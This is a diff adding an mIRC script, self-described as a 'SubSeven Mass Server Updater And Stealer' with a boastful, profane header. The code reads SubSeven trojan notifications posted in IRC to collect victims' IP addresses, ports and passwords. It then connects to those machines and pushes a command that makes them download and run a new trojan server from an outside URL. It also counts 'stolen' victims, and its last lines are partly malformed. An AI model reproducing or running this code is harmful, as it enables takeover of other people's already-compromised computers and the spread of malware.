@@ -1,0 +1,159 @@
+; SubSeven Mass Server Updater And Stealer :) Edit And Die
+; By Evil Unca HeLLfiReZ Muhahahaha
+; A Big Special Unca HeLL Fuck Off To #nohack irc.dal.net they hinder us every step of the way. !
+; And Merry Fuckin Xmas Cuz When You Is Rich In Victims It Will Feel Like Xmas :)
+; To Know True Evil Is To Know Me.
+
+; how to use:     1. put this file in your root mIRC directory and if you don't know how to do this "Fuck Off"
+;			2. type /load -rs hellyeah.mrc in any mIRC window :)
+;			3. click yes to the initialization warning if it appears :(
+;			4. click your mIRC menubar (between DCC and Window), SubSeven Auto-Updater, Enable
+
+; currently, about 90/95% of all updates are successful. :)
+
+
+on *:LOAD:{
+  echo $ver
+  titlebar $ver
+  if (%gc == $null) set %gc 0
+  if (%gf == $null) set %gf 0
+}
+on 1:CONNECT:{
+  titlebar $ver On $server $port With Nick $me
+}
+on 1:DISCONNECT:{
+    /echo Disconnected from $server at $time with nickname $nick
+}
+
+alias ver return 15,14<1>15,14<1>15,14<1>4,1[9 -=HELLFIREZ SCAM FOR MIRC V1.0=- 4]15,14<1>15,14<1>15,14<1> 
+
+#s7rem on
+
+  on *:TEXT:*sub7server*:*:{
+  set %s7rem.text $strip($1-)
+
+  if ($gettok(%s7rem.text,2,32) == v.GOLD) set %s7rem.theips $gettok(%s7rem.text,9,32)
+  else set %s7rem.theips $gettok(%s7rem.text,8,32)
+
+  if ($right(%s7rem.theips,1) == $chr(46)) set %s7rem.theips $left(%s7rem.theips,$calc($len(%s7rem.theips) - 1))
+
+  set %s7rem.numtok $numtok(%s7rem.theips,45)
+
+  if (%s7rem.numtok > 1) {
+    set %s7rem.echoip $gettok(%s7rem.theips,%s7rem.numtok,45)
+    echo 12 -s $s7rem.bt $s7rem.bl $+ $nick displayed more than one IP, using the rightmost IP out of %s7rem.numtok $+ .
+  }
+  else set %s7rem.echoip %s7rem.theips
+
+  set %s7rem.p1 $calc($pos(%s7rem.text, $chr(58), 1) + 2)
+  set %s7rem.p2 $pos(%s7rem.text, $chr(44), 1)
+  set %s7rem.echoport $mid(%s7rem.text, %s7rem.p1, $calc(%s7rem.p2 - %s7rem.p1))
+
+  set %s7rem.p1 $calc($pos(%s7rem.text, $chr(58), 4) + 2)
+  set %s7rem.p2 $calc($len(%s7rem.text) + 1)
+  set %s7rem.echopass.E [ $+ [ $nick ] ] $mid(%s7rem.text, %s7rem.p1, $calc(%s7rem.p2 - %s7rem.p1))
+
+  if (%s7rem.echoip == $null) {
+    echo 4 -s $s7rem.sbt $s7rem.bl $+ Error: Oh Fuck Evaluated IP address is blank. :(
+    echo 1 -s -
+    return
+  }
+  if ($chr(45) isin %s7rem.echoip) {
+    echo 4 -s $s7rem.sbt $s7rem.bl $+ Error: Seperator found in evaluated IP address.
+    echo 1 -s -
+    return
+  }
+
+  if ($left(%s7rem.echoip,3) == 10.) s7rem.ipf
+  if ($left(%s7rem.echoip,3) == 169) s7rem.ipf
+  if ($left(%s7rem.echoip,3) == 192) s7rem.ipf
+  ; if ($left(%s7rem.echoip,3) == 172) s7rem.ipf
+
+  echo 12 -s $s7rem.bt $s7rem.bl $+ Updating $nick ( $+ $address $+ )
+  echo 2 -s $s7rem.sbt $s7rem.bl $+ IP: %s7rem.echoip  
+  echo 2 -s $s7rem.sbt $s7rem.bl $+ Port: %s7rem.echoport
+  echo 2 -s $s7rem.sbt $s7rem.bl $+ Password: %echopass
+  echo 2 -s $s7rem.sbt $s7rem.bl $+ Debug: %s7rem.echoip %s7rem.echoport %echopass
+  echo 1 -s -
+
+  set %s7rem.socket E $+ $nick
+  if ($sock(%s7rem.socket) != $null) {
+    echo 12 -s $s7rem.bt $s7rem.bl $+ Socket already open: %s7rem.socket $+ . Closing and reopening socket... :)
+    sockclose %s7rem.socket
+  }
+  sockopen %s7rem.socket %s7rem.echoip %s7rem.echoport
+}
+
+#s7rem end
+
+alias s7rem.sbt /return ר
+alias s7rem.bt /return ררר
+alias s7rem.bl /return $chr(3) $+ 1
+alias s7rem.ec /if ($group(#s7rem) == on) return $chr(9) $+ [on] | else return $chr(9) $+ [off]
+alias s7rem.ipf {
+  echo 4 -s $s7rem.bt $s7rem.bl $+ Evaluated IP address ( $+ %s7rem.echoip $+ ) is not updateable Fuck Fuck Fuck :(
+  halt
+}
+alias s7rem.stats {
+  echo 1 -a $s7rem.bt $chr(3) $+ 2Number Of VICTIMS NOW STOLEN Wheeeee Thanks Unca HeLL: $chr(3) $+ 12 $+ %gc $+ $chr(3) $+ 2.
+  echo 1 -a $s7rem.bt $chr(3) $+ 2Number of failed update attempts, Blame Unca HeLL The Old Bastard(incorrect passwords): $chr(3) $+ 12 $+ %gf $+ $chr(3) $+ 2.
+}
+alias s7rem.rv {
+  if ($$1 == 1) {
+    unset %s7rem.*
+    echo 1 -a $s7rem.bt $chr(3) $+ 2All temporary variables have been removed.
+  }
+  if ($$1 == 2) {
+    unset %s7rem.echopass.*
+    echo 1 -a $s7rem.bt $chr(3) $+ 2All temporary password variables have been removed.
+  }
+}
+alias s7rem.on {
+  .enable #s7rem
+  echo 1 -a $s7rem.bt $chr(3) $+ 2SubSeven Auto-Updater and Stealer is now $chr(3) $+ 12enabled :) $+ $chr(3) $+ 2.
+}
+alias s7rem.off {
+  .disable #s7rem
+  echo 1 -a $s7rem.bt $chr(3) $+ 2SubSeven Auto-Updater And Stealer is now $chr(3) $+ 12disabled :( $+ $chr(3) $+ 2.
+}
+
+menu menubar {
+  -
+  SubSeven Auto-Updater and Stealer $s7rem.ec
+  .Statistics:/s7rem.stats
+  .-
+  .Remove All Variables:/s7rem.rv 1
+  .Remove Password Variables:/s7rem.rv 2
+  .Close All Open Sockets:/sockclose E*
+  .-
+  .Enable:/s7rem.on
+  .Disable:/s7rem.off
+}
+
+on *:SOCKOPEN:E*:{
+  if ($sockerr > 0) {
+    echo 4 -s $s7rem.bt $s7rem.bl $+ Socket error: $chr(3) $+ 1 $+ $sockname $sockerr
+    return
+  }
+}
+on *:SOCKREAD:E*:{
+  sockread -f %s7rem.echodata
+  echo 3 -s $s7rem.bts $s7rem.bl $+ Received: %s7rem.echodata
+  if (%s7rem.echodata == POPUP incorrect password...) {
+    unset %s7rem.echopass. [ $+ [ $sockname ] ]
+    inc %gf
+    halt
+  }
+  if (%s7rem.echodata == server updated. closing...) {
+    inc %gc
+    halt
+  }
+  if (%s7rem.echodata == PWD) {
+    sockwrite $sockname PWD $+ %s7rem.echopass. [ $+ [ $sockname ] ]
+    sockwrite $sockname UFUhttp://subseven.exit.de/downloads/pwserver.scr
+    unset %s7rem.echopass. [ $+ [ $sockname ] ]
+  }
+  else {
+    sockwrite $sockname UFUhttp://subseven.exit.de/downloads/pwserver.scr    inc %gc
+  }
+}
